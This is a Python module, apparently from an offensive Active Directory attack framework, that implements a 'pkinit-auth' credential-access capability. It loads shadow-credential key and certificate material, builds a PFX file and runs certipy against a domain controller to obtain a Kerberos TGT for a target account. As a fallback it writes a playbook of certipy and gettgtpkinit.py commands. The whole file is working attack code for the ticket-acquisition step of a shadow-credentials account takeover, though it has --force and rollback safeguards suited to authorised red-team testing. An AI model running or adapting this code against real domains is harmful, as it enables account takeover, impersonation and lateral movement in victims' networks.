"""PKINIT authentication using shadow-credential key material.

Loads a previously generated shadow key/cert from the session (or explicit
paths) and attempts certificate-based Kerberos TGT acquisition.

Requires --force (obtains a usable TGT). Secrets redacted unless --include-secrets.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path
from typing import Any, cast

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.registry import register_capability
from adaf_attack.core.rollback import record_pre_state
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


def _find_shadow_artifacts(session: Session, sam: str | None) -> dict[str, Path | None]:
    """Locate shadow-*.key.pem / cert.pem in the session directory."""
    key = cert = None
    if sam:
        k = session.path(f"shadow-{sam}.key.pem")
        c = session.path(f"shadow-{sam}.cert.pem")
        if k.exists() and c.exists():
            return {"key": k, "cert": c}
    # fallback: any shadow-*.key.pem
    for p in sorted(session.root.glob("shadow-*.key.pem")):
        sam_guess = p.name[len("shadow-") : -len(".key.pem")]
        c = session.path(f"shadow-{sam_guess}.cert.pem")
        if c.exists():
            return {"key": p, "cert": c, "sam": sam_guess}  # type: ignore[dict-item]
    return {"key": key, "cert": cert}


def _pfx_from_pem(key_pem: bytes, cert_pem: bytes) -> bytes:
    from cryptography.hazmat.primitives.serialization import (
        NoEncryption,
        load_pem_private_key,
        pkcs12,
    )
    from cryptography.x509 import load_pem_x509_certificate

    key = load_pem_private_key(key_pem, password=None)
    cert = load_pem_x509_certificate(cert_pem)
    return pkcs12.serialize_key_and_certificates(
        name=b"shadow",
        key=cast(Any, key),
        cert=cert,
        cas=None,
        encryption_algorithm=NoEncryption(),
    )


@register_capability(
    id="pkinit-auth",
    summary="PKINIT TGT using shadow-cred key/cert from session (requires --force)",
    category="credential-access",
    tags=("pkinit", "shadow-credentials", "tgt", "kerberos"),
    destructive=True,
)
class PkinitAuth:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        sam = kwargs.get("sam") or kwargs.get("write_target") or kwargs.get("username")
        key_path = kwargs.get("key")
        cert_path = kwargs.get("cert")
        pfx_path = kwargs.get("pfx")

        console.print(f"[bold]PKINIT auth[/bold] → {target.domain} @ {target.dc_ip}")

        if not force:
            raise RuntimeError(
                "pkinit-auth obtains a TGT and requires --force. "
                "Provide --sam matching shadow-<sam>.key.pem in the session, "
                "or --key/--cert/--pfx paths."
            )

        result: dict[str, Any] = {
            "domain": target.domain,
            "dc_ip": target.dc_ip,
            "sam": sam,
            "ok": False,
            "method": None,
        }

        # Resolve material
        if not pfx_path and (not key_path or not cert_path):
            found = _find_shadow_artifacts(session, sam)
            key_path = found.get("key")
            cert_path = found.get("cert")
            if not sam and found.get("sam"):
                sam = str(found["sam"])
                result["sam"] = sam

        if pfx_path:
            pfx_file = Path(pfx_path)
            if not pfx_file.exists():
                raise RuntimeError(f"PFX not found: {pfx_path}")
        elif key_path and cert_path:
            key_p = Path(key_path)
            cert_p = Path(cert_path)
            if not key_p.exists() or not cert_p.exists():
                raise RuntimeError(f"key/cert not found: {key_path} / {cert_path}")
            pfx_bytes = _pfx_from_pem(key_p.read_bytes(), cert_p.read_bytes())
            pfx_file = session.path(f"shadow-{(sam or 'user')}.pfx")
            pfx_file.write_bytes(pfx_bytes)
            console.print(f"  Built PFX → {pfx_file}")
        else:
            raise RuntimeError(
                "No shadow key/cert in session and no --key/--cert/--pfx given. "
                "Run shadow-creds --force --write-target <sam> first."
            )

        identity = sam or target.username
        if not identity:
            raise RuntimeError("Need sam/username for PKINIT principal")

        # Method 1: certipy
        try:
            session.path(f"pkinit-{(identity)}.ccache")
            cmd = [
                sys.executable,
                "-m",
                "certipy",
                "auth",
                "-pfx",
                str(pfx_file),
                "-dc-ip",
                target.dc_ip,
                "-domain",
                target.domain,
                "-username",
                identity.split("@")[0],
            ]
            # certipy writes <user>.ccache in cwd by default — run in session dir
            proc = subprocess.run(
                cmd,
                cwd=str(session.root),
                capture_output=True,
                text=True,
                timeout=120,
            )
            result["method"] = "certipy"
            result["returncode"] = proc.returncode
            result["stdout"] = (proc.stdout or "")[-2000:]
            result["stderr"] = (proc.stderr or "")[-2000:]
            # locate ccache
            ccaches = list(session.root.glob("*.ccache"))
            if proc.returncode == 0 and ccaches:
                result["ok"] = True
                result["ccache"] = str(ccaches[-1])
                record_pre_state(
                    session,
                    kind="local-artifact",
                    target=identity,
                    artifact=str(ccaches[-1]),
                    extra={"material": "ccache", "pfx": str(pfx_file)},
                )
                console.print(f"  [green]TGT via certipy[/green] → {ccaches[-1]}")
            elif proc.returncode == 0:
                result["ok"] = True
                console.print("  [green]certipy auth exited 0[/green] (locate ccache in session)")
            else:
                console.print(f"  [yellow]certipy failed[/yellow] rc={proc.returncode}")
                console.print(f"  {(proc.stderr or proc.stdout or '')[:400]}")
        except FileNotFoundError:
            result["method"] = "certipy-missing"
        except Exception as exc:  # noqa: BLE001
            result["method"] = "certipy-error"
            result["error_certipy"] = str(exc)

        # Method 2: Impacket getTGT PKINIT (if available)
        if not result.get("ok"):
            try:
                result["method"] = result.get("method") or "impacket"
                # Best-effort: export PFX path + playbook for gettgtpkinit.py
                playbook = session.path("pkinit.playbook.txt")
                playbook.write_text(
                    "\n".join(
                        [
                            f"# PKINIT playbook for {identity}@{target.domain}",
                            f"# PFX: {pfx_file}",
                            f"certipy auth -pfx {pfx_file} -dc-ip {target.dc_ip} "
                            f"-domain {target.domain} -username {identity.split('@')[0]}",
                            f"# or: gettgtpkinit.py -cert-pfx {pfx_file} "
                            f"{target.domain}/{identity.split('@')[0]} {session.path('tgt.ccache')}",
                            f"export KRB5CCNAME={session.path('tgt.ccache')}",
                        ]
                    )
                    + "\n",
                    encoding="utf-8",
                )
                result["playbook"] = str(playbook)
                result["pfx"] = str(pfx_file)
                console.print(f"  Playbook → {playbook}")
                if not result.get("ok"):
                    console.print(
                        "  [yellow]Install certipy-ad for in-process PKINIT, "
                        "or run the playbook.[/yellow]"
                    )
            except Exception as exc:  # noqa: BLE001
                result["error"] = str(exc)

        # Redact paths unless include_secrets
        if not include_secrets and result.get("ccache"):
            result["ccache_present"] = True
            # keep path — it's a ticket file path, operator needs it; don't dump ticket bytes

        out_path = session.path("pkinit-auth.json")
        out_path.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        session.log("pkinit-auth.complete", ok=result.get("ok"), method=result.get("method"))
        console.print(f"Results → {out_path}")
        return result
